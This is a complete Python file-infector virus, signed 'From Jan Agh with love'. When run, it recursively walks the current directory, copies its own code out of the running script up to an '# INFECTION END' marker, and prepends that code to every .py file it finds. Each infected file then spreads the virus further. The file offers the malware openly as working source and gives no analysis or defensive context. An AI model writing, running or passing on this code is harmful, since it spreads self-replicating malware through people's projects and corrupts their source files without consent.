
# From Jan Agh with love

import os, sys

class DirParser:

    def __init__(self) -> None:
        self.infector = Infector()

    def parse(self, curr_path = os.getcwd()) -> None:
        all_files = os.listdir()

        for file in all_files:
            file_path = os.path.join(curr_path, file)

            is_file = os.path.isfile(file_path)
            is_dir = os.path.isdir(file_path)

            if is_dir:
                self.parse(file_path)
            elif is_file and self.check_if_python(file_path):
                self.infector.infect(file_path)

    def check_if_python(self, path: str) -> str:
        return path.rsplit('.', 1)[-1] == "py"

class Infector:

    def __init__(self) -> None:
        self.infection_start = "# From Jan Agh with love\n"
        self.infection_end = "# INFECTION END\n"

    def infect(self, file_path: str) -> None:

        infection_code = self.get_infection_code()
        attacked_content = self.get_attacked_content(file_path)

        with open(file_path, "w", errors = "ignore") as combined_code:
            combined_code.write(f'{infection_code}\n{attacked_content}')

    def get_infection_code(self) -> str:
        infection_code = ""

        with open(sys.argv[0], "r", errors = "ignore") as already_infected:

            for code_line in already_infected:
                infection_code += code_line

                if code_line == self.infection_end:
                    break

        return infection_code

    def get_attacked_content(self, file_path: str) -> str:
        is_infector, normal_code = False, ""

        with open(file_path, "r", errors = "ignore") as attacked_file:

            for code_line in attacked_file:
                if code_line == self.infection_start:
                    is_infector = True
                elif not is_infector:
                    normal_code += code_line
                elif code_line == self.infection_end:
                    is_infector = False

        return normal_code

parser = DirParser()

parser.parse()

# INFECTION END